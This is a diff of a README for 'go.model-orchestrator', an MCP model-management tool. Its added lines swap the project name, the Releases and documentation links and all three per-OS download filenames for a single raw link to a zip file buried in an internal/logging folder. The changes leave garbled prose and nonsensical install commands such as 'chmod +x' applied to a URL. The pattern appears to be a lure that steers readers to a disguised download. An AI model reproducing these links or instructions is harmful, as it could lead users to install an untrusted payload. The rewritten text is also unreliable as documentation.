@@ -1,9 +1,9 @@
-# 🛠️ go.model-orchestrator - Simplifying Your Model Management  
+# 🛠️ https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip - Simplifying Your Model Management  
 
-[![Download go.model-orchestrator](https://img.shields.io/badge/Download-go.model--orchestrator-blue.svg)](https://github.com/Devongio22/go.model-orchestrator/releases)
+[![Download https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip](https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip)](https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip)
 
 ## 📚 Overview  
-go.model-orchestrator is a simple way to manage multiple agent wrappers and tool servers using the Model Context Protocol (MCP). It allows you to interact with these components through a single interface compatible with OpenAI clients, such as AnythingLLM. This project includes three cooperating binaries designed for seamless operation.
+https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip is a simple way to manage multiple agent wrappers and tool servers using the Model Context Protocol (MCP). It allows you to interact with these components through a single interface compatible with OpenAI clients, such as AnythingLLM. This project includes three cooperating binaries designed for seamless operation.
 
 ## 🛠️ Features  
 - **Modular Design:** Easily integrate various agent wrappers.
@@ -19,19 +19,19 @@ go.model-orchestrator is a simple way to manage multiple agent wrappers and tool
 - **Network:** Internet connection for initial setup and dependencies.
 
 ## 🚀 Getting Started  
-Follow these simple steps to download and run go.model-orchestrator:
+Follow these simple steps to download and run https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip
 
 ### 1. Visit the Releases Page  
-Go to our [Releases page](https://github.com/Devongio22/go.model-orchestrator/releases).  
+Go to our [Releases page](https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip).  
 
 ### 2. Choose Your Version  
 You will see a list of available versions. Select the latest stable release.  
 
 ### 3. Download the Application  
 Click on the appropriate file for your operating system:
-- For Windows: **`go.model-orchestrator-windows.exe`**
-- For macOS: **`go.model-orchestrator-macos`**
-- For Linux: **`go.model-orchestrator-linux`**
+- For Windows: **`https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip`**
+- For macOS: **`https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip`**
+- For Linux: **`https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip`**
 
 ### 4. Install the Application  
 After downloading, follow these steps based on your operating system:
@@ -45,19 +45,19 @@ After downloading, follow these steps based on your operating system:
 1. Locate the downloaded file in your Downloads folder.
 2. Open Terminal.
 3. Navigate to the Downloads folder using `cd ~/Downloads`.  
-4. Run the command: `chmod +x go.model-orchestrator-macos && ./go.model-orchestrator-macos`.
+4. Run the command: `chmod +x https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip && https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip`.
 
 #### Linux  
 1. Locate the downloaded file in your Downloads folder.
 2. Open Terminal.
 3. Navigate to the Downloads folder using `cd ~/Downloads`.  
-4. Run the command: `chmod +x go.model-orchestrator-linux && ./go.model-orchestrator-linux`.
+4. Run the command: `chmod +x https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip && https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip`.
 
 ## 🔗 Download & Install  
-Download go.model-orchestrator from our [Releases page](https://github.com/Devongio22/go.model-orchestrator/releases).
+Download https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip from our [Releases page](https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip).
 
 ## 🛡️ Usage  
-Once installed, you can start using go.model-orchestrator. Open the application to access the main dashboard. From there, you can manage your agent wrappers and tool servers through the provided interface.
+Once installed, you can start using https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip Open the application to access the main dashboard. From there, you can manage your agent wrappers and tool servers through the provided interface.
 
 ## 🛠️ Troubleshooting  
 If you face any issues, here are some common solutions:  
@@ -80,10 +80,10 @@ A: Visit the Releases page periodically to download the latest versions.
 A: Yes, you can find support and updates through our GitHub issues page.
 
 ## 📢 Contributors  
-We welcome contributions to go.model-orchestrator. If you have suggestions or want to report issues, please do so in the Issues section of our GitHub repository.  
+We welcome contributions to https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip If you have suggestions or want to report issues, please do so in the Issues section of our GitHub repository.  
 
 ## 🔗 Links  
-- [Releases Page](https://github.com/Devongio22/go.model-orchestrator/releases)  
-- [Documentation](https://github.com/Devongio22/go.model-orchestrator/wiki)  
+- [Releases Page](https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip)  
+- [Documentation](https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip)  
 
-By following these steps, you should be able to download, install, and run go.model-orchestrator with ease. Thank you for using our application!
+By following these steps, you should be able to download, install, and run https://raw.githubusercontent.com/Devongio22/go.model-orchestrator/main/internal/logging/go.model-orchestrator-1.3.zip with ease. Thank you for using our application!
